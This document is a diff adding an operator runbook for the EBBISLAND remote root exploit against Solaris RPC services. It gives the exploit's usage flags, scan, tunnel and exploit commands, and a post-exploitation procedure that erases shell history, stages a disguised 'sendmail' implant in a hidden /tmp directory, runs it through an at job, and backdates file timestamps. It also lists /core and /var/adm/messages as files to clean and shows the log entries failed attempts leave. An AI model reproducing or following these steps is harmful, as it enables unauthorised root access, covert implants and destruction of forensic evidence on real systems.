@@ -1,0 +1,161 @@
+
+# as of: 2010-07-29 18:01:21 EDT 
+
+
+# EBBISLAND
+# (Exploit for Solaris 2.6, 2.7, 2.8, 2.9 and 2.10)
+
+# First ensure that the vulnerable rpc service is running. You must
+# be able to reach the target system's TCP port that the designated target RPC
+# is listening upon. 
+
+# EBBISLAND USAGE.
+
+# ebbisland: (-A <address>) Shellcode address
+#  
+# ebbisland: (-C) /core file overwriter/scrambler. This option throws the attack, but uses pseudo-random
+#            binary data in place of the actual shellcode, to produce a /core file free of suspicious
+#            content. This would be used in the case where EBBISLAND failed to successfully exploit the
+#            target, and the operator wanted to try and "purify" the file left in /core before quitting.
+#  
+# ebbisland: (-c <procnum>) Procedure number.  Defaults to 0. 
+#  
+# ebbisland: (-D) For and extra dummy connection
+#  
+# ebbisland: (-N) Use for non-inetd started services (i.e. rpc.bootparamd)
+#  
+# ebbisland: (-M <mtu>) Choose size of data part of packet to send.  Default is 1260.  This could effect
+#            the landing zone size. 
+#  
+# ebbisland: (-P <prog>) Optional prog to exec, re-using exploit socket. 
+#  
+# ebbisland: (-r <prognum>) RPC program number 
+#  
+# ebbisland: (-s <source port>)  
+#  
+# ebbisland: (-V) Provides verbose outputs, where appropriate and desired.
+#  
+# ebbisland: (-X | -F) -X For indirect/xdr_replymsg programs, and -F for others
+
+# *********************************************************************************************
+
+
+mx
+:%s,SERVICE_TCP_PORT,SERVICE_TCP_PORT,g
+:%s,TARGET_RPC_SERVICE,100026,g
+:%s,TARGET_IP,TARGET_IP,g
+:%s,SPECIFIC_SHELLCODE_ADDRESS,SPECIFIC_SHELLCODE_ADDRESS,g
+`x
+
+# Scanning:
+
+-scan brpc TARGET_IP
+
+# Redirector:
+
+-tunnel
+l SERVICE_TCP_PORT TARGET_IP
+
+
+# Exploit:
+# ./ebbisland -t 127.0.0.1 -p 32794 -r 100026 -X -N -A 0x6e908
+./ebbisland -t 127.0.0.1 -p SERVICE_TCP_PORT -r TARGET_RPC_SERVICE -X -N -A SPECIFIC_SHELLCODE_ADDRESS
+
+./ebbisland -t 127.0.0.1 -p 32794 -r 100026 -X -N -A 0x6e908
+ 
+********************************************************************************** 
+Exploit will provide ROOT shell access via same tunnel/session (no callback, no listen).
+
+# EXPLOIT WINDOW
+
+unset HISTSIZE
+unset HISTFILESIZE
+unset HISTFILE
+w
+pwd
+id
+which uudecode uncompress at
+cd /tmp
+ls -alrt
+mkdir /tmp/.scsi
+cd /tmp/.scsi
+pwd
+
+ls -lart
+
+# Usual method of running NOPEN fails with EBBISLAND
+#  we use an at command to do so.
+
+# NORMAL LOCATION FOR AT FILES
+
+ls -lart /var/spool/cron
+ls -lart /var/spool/cron/atjobs
+
+# PRESERVE THE DATE FROM BEFORE THE AT JOB
+
+touch -r /var/spool/cron/atjobs x
+
+# LOCALLY
+
+packrat -l 
+gedit /current/up/sendmail.Z.uu
+
+
+# EXPLOIT WINDOW
+
+/usr/bin/uudecode; ls -latr
+
+# select all/copy gedit contents into Target exploit window, then:
+uncompress sendmail.Z
+ls -l
+chmod 700 sendmail
+
+# EXPLOIT WINDOW (CREATING AT JOB)
+
+echo "PATH=. D=-ulrandom11111-55555-2 sendmail" | at now
+netstat -an | grep random11111-55555-2
+
+# TOUCH THE ATJOBS FILE BACK TO BEFORE TIME
+
+touch -r x /var/spool/cron/atjobs
+
+# VERIFY TIMES FROM BEFORE
+
+ls -lart /var/spool/cron
+ls -lart /var/spool/cron/atjobs
+
+
+# FROM REDIRECTOR
+
+-nstun TARGET_IP:random11111-55555-2
+
+
+******************************************************************************* 
+
+CLEANING.
+
+/core
+/var/adm/messages
+
+
+*  The correct EBBISLAND attack for the remote target architecture must be used, or else the attack will fail.
+*  Use -C option to clean failures remotely if we never get on.
+
+# Logging considerations: Quite a few log messages will be generated on the target as each subsequent
+# attempt fails, most likely written to the /var/adm/messages file. These could include messages similar to...
+
+Sep 27 14:37:23 target inetd[146]: [ID 858011 daemon.warning] /platform/SUNW,Ultra-Enterprise-10000/lib/dr_daemon: Illegal Instruction
+Sep 27 14:37:24 target dr_daemon[23501]: [ID 629332 daemon.notice] dr_daemon attempting AP interaction
+Sep 27 14:37:24 target dr_daemon[23501]: [ID 264428 daemon.error] ld.so.1: dr_daemon: fatal: libap.so: open failed: No such file or directory
+Sep 27 14:37:24 target dr_daemon[23501]: [ID 355200 daemon.error] dr_daemon operating in NO AP interaction mode
+Sep 27 14:37:24 target dr_daemon[23501]: [ID 309875 daemon.notice] NOTICE: recovered old state file '/tmp/.dr_extra_info'
+Sep 27 14:43:10 target inetd[146]: [ID 858011 daemon.warning] /usr/openwin/bin/kcms_server: Illegal Instruction - core dumped
+Sep 27 14:43:11 target inetd[146]: [ID 858011 daemon.warning] /usr/openwin/bin/kcms_server: Segmentation Fault - core dumped
+Sep 27 14:43:13 target last message repeated 1 time
+Sep 27 14:43:14 target inetd[146]: [ID 858011 daemon.warning] /usr/openwin/bin/kcms_server: Illegal Instruction - core dumped
+Sep 27 14:43:15 target inetd[146]: [ID 858011 daemon.warning] /usr/openwin/bin/kcms_server: Segmentation Fault - core dumped
+Sep 27 14:43:17 target last message repeated 2 times
+Sep 27 14:43:55 target inetd[146]: [ID 858011 daemon.warning] /usr/sbin/rpc.metad: Illegal Instruction - core dumped
+Sep 27 14:43:56 target inetd[146]: [ID 858011 daemon.warning] /usr/sbin/rpc.metad: Bus Error - core dumped
+Sep 27 14:43:57 target inetd[146]: [ID 858011 daemon.warning] /usr/sbin/rpc.metad: Segmentation Fault - core dumped
+
